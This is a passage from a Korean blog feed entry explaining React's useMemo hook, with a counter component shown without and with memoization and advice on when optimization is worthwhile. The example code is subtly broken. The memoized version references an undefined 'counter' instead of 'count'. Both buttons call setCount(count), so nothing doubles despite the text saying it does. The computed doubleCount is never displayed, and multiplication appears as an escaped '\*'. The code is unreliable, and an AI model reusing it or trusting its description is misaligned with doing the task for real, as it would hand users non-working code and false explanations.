리랜더링 되는 경우 등이 있습니다. 만약 컴포넌트의 리랜더링에 불필요하게 오랜 시간이 걸린다면, 사용자는 UI에서 지연이 발생하는 경험을 하게 됩니다.</p> <div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">memoizedValue</span> <span class="o">=</span> <span class="nf">useMemo</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nf">computeExpensiveValue</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">),</span> <span class="p">[</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">]);</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">useMemo</code> 함수는 <strong>2개의 인자</strong>를 받습니다. 첫번째 인자로는 결과값을 생성해내는 팩토리 함수, 즉 리턴 콜백 함수를 받습니다. 두번째 인자는 결과값을 재활용할 때 기준이 되는 입력값 배열입니다. 두번째 인자로 전달된 값이 이전과 다른 경우에만 첫번째 값이 실행되며, 이를 통해 함수형 컴포넌트 내에서 계산되는 값에 대한 최적화를 할 수 있습니다.</p> <p><code class="language-plaintext highlighter-rouge">useMemo</code>에 전달된 함수는 랜더링 중에 실행됩니다. 때문에 랜더링과 관련된 내용만 전달해야하며, 랜더링과 관계 없는 경우는 <code class="language-plaintext highlighter-rouge">useEffect</code>를 사용하길 권장합니다.</p> <blockquote> <p>전달되는 콜백 함수의 이름이 <code class="language-plaintext highlighter-rouge">computeExpensiveValue</code>라는데서 짐작할 수 있지만, <code class="language-plaintext highlighter-rouge">useMemo</code>를 통해 재활용되는 로직이 복잡한 경우 불필요한 연산을 막을 수 있고 성능상의 차이를 가져올 수 있습니다.</p> </blockquote> <hr/> <h3 id="usememo-예제">useMemo 예제</h3> <p>간단한 예제와 함께 살펴보겠습니다.</p> <blockquote> <p>without useMemo</p> </blockquote> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">Counter</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">count</span><span class="p">,</span> <span class="nx">setCount</span><span class="p">]</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nf">useState</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">doubleCount</span> <span class="o">=</span> <span class="nx">count</span> <span class="err">\</span><span class="o">*</span> <span class="mi">2</span>

    <span class="k">return </span><span class="p">(</span>
        <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">React</span> <span class="nx">Hooks</span><span class="p">:</span> <span class="nx">useMemo</span> <span class="nx">example</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>            <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">onClick</span><span class="o">=</span><span class="p">{()</span> <span class="o">=&gt;</span> <span class="nf">setCount</span><span class="p">(</span><span class="nx">count</span><span class="p">)}</span><span class="o">&gt;</span><span class="nx">Double</span> <span class="nx">Counter</span><span class="p">:</span> <span class="p">{</span><span class="nx">count</span><span class="p">}</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
</span>        <span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span>    <span class="p">)</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>버튼을 클릭할 때마다 이전보다 두 배 큰 값이 반환됩니다. 하지만 count 값과 상관없이 컴포넌트가 리랜더링 되었을 때 불필요하게 연산을 수행하게 됩니다. 간단한 사례지만, 이보다 더 복잡한 연산이거나 컴포넌트의 상태값이 많은 경우 그만큼의 리소스가 낭비될 수 있습니다.</p> <blockquote> <p>with useMemo</p> </blockquote> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">Counter</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">count</span><span class="p">,</span> <span class="nx">setCount</span><span class="p">]</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nf">useState</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">doubleCount</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nf">useMemo</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">counter</span> <span class="err">\</span><span class="o">*</span> <span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="nx">count</span><span class="p">])</span>

    <span class="k">return </span><span class="p">(</span>
        <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">React</span> <span class="nx">Hooks</span><span class="p">:</span> <span class="nx">useMemo</span> <span class="nx">example</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>            <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">onClick</span><span class="o">=</span><span class="p">{()</span> <span class="o">=&gt;</span> <span class="nf">setCount</span><span class="p">(</span><span class="nx">count</span><span class="p">)}</span><span class="o">&gt;</span><span class="nx">Double</span> <span class="nx">Counter</span><span class="p">:</span> <span class="p">{</span><span class="nx">count</span><span class="p">}</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
</span>        <span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span>    <span class="p">)</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <p><code class="language-plaintext highlighter-rouge">useMemo</code>를 사용한다면, 의존하는 값(count)이 변경되는 경우만 연산되므로 불필요한 연산을 막을 수 있습니다.</p> <h3 id="usememo-언제-필요할까">useMemo, 언제 필요할까?</h3> <p>일반적으로 memoization의 기법을 활용한 컴포넌트 성능 최적화는 잘 사용되지 않습니다. React의 reconciliation과 Virtual DOM이 충분히 빠르고, 대부분의 사용자가 체감할 정도의 성능 최적화가 필요한 상황이 그리 자주 있지 않기 때문입니다. 또한 실행되는 모든 코드는 그만큼의 비용을 요구하기 때문에, 무분별한 함수 호출은 리소스 낭비로 이어져 성능 개선이 아닌 악화로 이어질 수 있습니다.</p> <p>만약 프론트엔드 단에서 처리해야만 하는 복잡한 연산이 필요한 경우가 있다고 하더라도, 가장 먼저 <code class="language-plaintext highlighter-rouge">useMemo</code>나 <code class="language-plaintext highlighter-rouge">useCallback</code>와 같은 최적화 기법을 도입하는 것은 좋지 않습니다. 대신, <code class="language-plaintext highlighter-rouge">useEffect</code> 함수 등을 이용해 비동기로 처리하는 방안을 먼저 고려하거나 클래스 기반의 컴포넌트인 경우 <code class="language-plaintext highlighter-rouge">shouldComponentUpdate</code>를 사용해보는건 어떨까요?</p> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://reactjs.org/docs/hooks-reference.html#usememo">Hook API reference - useMemo :: React Official Docs</a> 📌 <a href="https://reactjs.org/docs/reconciliation.html">React - Reconciliation :: React Official Docs</a></p>]]></content><author><name></name></author><category term="React"/><category term="hooks"/><category term="useMemo"/><category term="memoization"/><summary type="html"><![CDATA[useMemo란?]]></summary></entry></feed>